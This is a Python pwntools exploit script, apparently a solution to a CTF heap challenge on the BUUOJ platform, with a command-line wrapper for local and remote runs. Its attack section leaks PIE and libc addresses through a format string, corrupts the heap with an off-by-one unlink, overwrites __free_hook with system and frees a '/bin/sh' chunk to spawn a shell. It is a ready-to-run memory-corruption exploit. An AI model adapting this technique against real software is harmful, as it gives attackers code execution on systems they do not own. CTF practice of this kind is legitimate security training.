from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function
    # print('[&]', filename, debug, tmux, gdb_breakpoint, ip, port, local_log, pwn_log, stop_function)
    # change
    if PORT:
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    elif '0x' in GDB_BREAKPOINT:
        gdb.attach(io, gdbscript='b *{}\nc\n'.format(GDB_BREAKPOINT))
    else:
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        input("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        input("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1


context.update(os='linux', log_level=PWN_LOG_LEVEL, arch='amd64')
##########################################
##############以下为攻击代码###############
##########################################

# ubuntu16 unlink

def add_note(idx:int, size:int, payload:bytes = b'\x00'):
    global io
    assert idx < 10 and idx >= 0, 'idx error'
    assert size > 0x80, 'size error'
    io.sendlineafter(">> ", '1')
    io.sendlineafter("Enter the index you want to create (0-10):", str(idx))
    io.sendlineafter("Enter a size:\n", str(size))
    io.sendlineafter("Enter the content: \n", payload)
    io.recvuntil("Done!\n")


def delete_note(idx:int):
    global io
    assert idx < 10 and idx >= 0, 'idx error'
    io.sendlineafter(">> ", '2')
    io.sendlineafter("Enter an index:\n", str(idx))
    io.recvuntil("Done!\n")


def edit_note(idx:int, payload:bytes):
    global io
    assert idx < 10 and idx >= 0, 'idx error'
    io.sendlineafter(">> ", '4')
    io.sendlineafter("Enter an index:\n", str(idx))
    io.sendlineafter("Enter the content: \n", payload)
    io.recvuntil("Done!\n")


io.sendlineafter("Enter your name: ", '%11$lx%15$lx')
msg = io.recvline()
leak_addr1 = msg[7 : 19]
leak_addr2 = msg[19 : -1]

pie_base_addr = int(leak_addr1.decode(), 16) - 28 - 0x116a
libc_start_main_addr = int(leak_addr2.decode(), 16) - 240
if DEBUG:
    system_addr = libc_start_main_addr + 0x24c40
    free_hook_addr = libc_start_main_addr + 0x3a5068
else:
    libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
    LOG_ADDR('libc_base', libc_start_main_addr - libc.dump('__libc_start_main'))
    system_addr = libc_start_main_addr - libc.dump('__libc_start_main') + libc.dump('system')
    free_hook_addr = libc_start_main_addr - libc.dump('__libc_start_main') + libc.dump('__free_hook')

LOG_ADDR('pie_base_addr', pie_base_addr)
LOG_ADDR('libc_start_main_addr', libc_start_main_addr)
LOG_ADDR('system_addr', system_addr)
LOG_ADDR('free_hook_addr', free_hook_addr)

note_addr = 0x202060 + pie_base_addr
LOG_ADDR('note_addr', note_addr)

# add 4 note
add_note(0, 0x88) # 0
add_note(1, 0x88) # 1
add_note(2, 0x88) # 2
add_note(3, 0x88, '/bin/sh\x00') # 3

# off by one
payload = p64(0) + p64(0x81)
payload += p64(note_addr + 0x10 - 0x18) # fake fd
payload += p64(note_addr + 0x10 - 0x10) # fake bk
payload += 0x60 * b'a' 
payload += p64(0x80) # pre size 
payload += b'\x90' # size

edit_note(1, payload)

delete_note(2)

payload = p64(0) + p64(free_hook_addr) + b'\x88'
edit_note(1, payload)

edit_note(0, p64(system_addr))

io.sendlineafter(">> ", '2')
io.sendlineafter("Enter an index:\n", str(3))

io.interactive()



